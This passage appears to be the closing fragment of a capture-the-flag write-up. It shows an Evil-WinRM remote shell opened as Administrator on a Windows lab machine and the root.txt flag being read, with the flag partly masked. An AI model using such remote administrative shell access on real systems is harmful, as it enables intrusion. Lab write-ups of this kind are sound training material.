Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>

```

And `root.txt`:

```
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
43d7b635************************

```